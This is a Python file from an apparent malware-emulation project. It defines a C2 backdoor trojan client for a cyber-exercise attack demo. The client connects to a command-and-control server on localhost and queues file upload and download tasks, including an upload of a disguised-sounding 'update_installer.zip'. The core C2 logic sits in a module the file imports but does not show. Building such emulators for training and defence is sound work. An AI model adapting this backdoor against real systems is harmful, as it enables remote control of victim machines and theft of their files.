#-----------------------------------------------------------------------------
# Name:        c2MwUtilsTest.py
#
# Purpose:     This module is one of the test case C2 backdoor Trojan program 
#              (hook with the C2-client) example which inherited from <c2MwUtils> 
#              module's <c2TestMalware> class.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.2.3
# Created:     2023/10/19
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
""" Program design: 
    We want to implement a remote backdoor trojan which can carry other Malicious
    Action function to build a remote controlable malware which can linked in our 
    C2 emulation system (https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/c2Emulator)
    This program will be used in the testRun attack demo and verfication of the 
    cyber event : Cross Sward 2023
"""

import os
import time
import c2MwUtils

HTTPS_FLG = False # flag to identify whether connect to C2 via http/https
dirpath = os.path.dirname(__file__)
TEST_TASK_FLG = True

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class c2BackdoorTrojan(c2MwUtils.c2TestMalware):

    def __init__(self, malwareID, ownIp, c2Ipaddr, c2port=5000, reportInt=10, tasksList=None, c2HttpsFlg=HTTPS_FLG, cmdTDFlg=False) -> None:
        super().__init__(malwareID, ownIp, c2Ipaddr, c2port=c2port, reportInt=reportInt, tasksList=tasksList, c2HttpsFlg=c2HttpsFlg, cmdTDFlg=cmdTDFlg)
        print("c2Backdoor Trojan init finished")

    #-----------------------------------------------------------------------------
    def _preporcessTasks(self):
        if TEST_TASK_FLG: return None
        if not self.tasksList is None:
            # Append on file upload task
            self.tasksList.append({
                'taskID'    : 1,
                'taskType'  : c2MwUtils.UPLOAD_FLG,
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : c2MwUtils.TASK_A_FLG,
                'taskData'  : [os.path.join(dirpath, "update_installer.zip")]
            })
            # Append one file download task
            self.tasksList.append({
                'taskID'    : 2,
                'taskType'  : c2MwUtils.DOWNLOAD_FLG,
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : c2MwUtils.TASK_A_FLG,
                'taskData'  : ['2023-12-13_100327.png','NCL_SGX Service.docx']
            })

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    malwareID = 'c2backDoorTrojan'
    c2Ipaddr = '127.0.0.1'
    malownIP = '192.168.50.11'
    client = c2BackdoorTrojan(malwareID, malownIP, c2Ipaddr)
    time.sleep(1)
    client.run()
    client.stop()

#-----------------------------------------------------------------------------
if __name__ == '__main__':
    main()
